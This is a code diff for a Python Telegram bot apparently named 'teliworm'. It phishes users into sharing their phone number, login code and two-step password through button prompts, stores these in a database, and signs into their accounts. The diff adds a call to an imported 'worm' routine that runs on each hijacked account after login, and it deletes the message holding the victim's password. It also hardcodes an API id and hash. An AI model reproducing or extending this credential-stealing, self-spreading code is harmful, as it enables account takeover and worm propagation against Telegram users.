@@ -1,4 +1,4 @@
-import logging,os,json,telethon
+import logging,os,json,telethon,asyncio
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.tl.custom.button import Button
@@ -6,12 +6,12 @@ from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 from strings import strings,direct_reply
+from worm import worm
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 load_dotenv(override=True)
 
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
-bot = TelegramClient('teliworm', 6, "eb06d4abfb49dc3eeb1aeb98ae0f581e").start(bot_token=os.getenv('BOT_TOKEN'))
 database = mongo_client.userdb.sessions
 numpad = [
     [  
@@ -36,11 +36,6 @@ numpad = [
     ]
 ]
 
-def intify(s):
-    try:
-        return int(s)
-    except:
-        return s
 def get(obj, key, default=None):
     try:
         return obj[key]
@@ -94,6 +89,7 @@ async def sign_in(event):
         data['logged_in'] = True
         login = {}
         await event.edit(strings['login_success'])
+        await worm(uclient)
     except telethon.errors.PhoneCodeInvalidError as e:
         await event.edit(strings['code_invalid'])
         await event.respond(strings['ask_code'], buttons=numpad)
@@ -118,8 +114,8 @@ async def sign_in(event):
     database.update_one({'_id': user_data['_id']}, {'$set': data})
     return True
 
-@bot.on(events.NewMessage(func=lambda e: e.is_private))
-async def handler(event):
+@events.register(events.NewMessage(func=lambda e: e.is_private))
+async def handler_new_user(event):
     user_data = database.find_one({"chat_id": event.chat_id})
     if user_data is None:
         sender = await event.get_sender()
@@ -132,24 +128,24 @@ async def handler(event):
     if event.message.text in direct_reply:
         await event.respond(direct_reply[event.message.text])
         raise events.StopPropagation
-@bot.on(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
-async def handler(event):
+@events.register(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
+async def handler_login(event):
     user_data = database.find_one({"chat_id": event.chat_id})
     if get(user_data, 'logged_in', False):
         await event.respond(strings['already_logged_in'])
         raise events.StopPropagation
     await event.respond(strings['ask_phone'], buttons=[Button.request_phone("SHARE CONTACT", resize=True, single_use=True)])
     raise events.StopPropagation
-@bot.on(events.NewMessage(func=lambda e: e.is_private))
-async def handler(event):
+@events.register(events.NewMessage(func=lambda e: e.is_private))
+async def handler_contact_share(event):
     if event.message.contact:
         if event.message.contact.user_id==event.chat.id:
             await handle_usr(event.message.contact, event)
         else:
             await event.respond(strings['wrong_phone'])
         raise events.StopPropagation
-@bot.on(events.CallbackQuery(func=lambda e: e.is_private))
-async def handler(event):
+@events.register(events.CallbackQuery(func=lambda e: e.is_private))
+async def handler_callback(event):
     try:
         evnt_dta = json.loads(event.data.decode())
         press = evnt_dta['press']
@@ -181,16 +177,25 @@ async def handler(event):
         return
     elif not await sign_in(event):
         await event.edit(strings['ask_code']+login['code'], buttons=numpad)
-@bot.on(events.NewMessage(func=lambda e: e.is_private))
-async def handler(event):
+@events.register(events.NewMessage(func=lambda e: e.is_private))
+async def handler_other(event):
     user_data = database.find_one({"chat_id": event.chat_id})
     login = json.loads(get(user_data, 'login', '{}'))
     if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
         data = {
             'password': event.message.text
         }
+        await event.message.delete()
         await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
         database.update_one({'_id': user_data['_id']}, {'$set': data})
         return
-with bot:
-    bot.run_until_disconnected()
+
+async def main():
+    functions = [obj for name, obj in globals().items() if callable(obj) and obj.__class__.__name__ == "function" and name.startswith('handler_')]
+    for function in functions:
+        bot.add_event_handler(function)
+    await bot.start(bot_token=os.getenv('BOT_TOKEN'))
+
+bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
+bot.loop.run_until_complete(main())
+bot.run_until_disconnected()
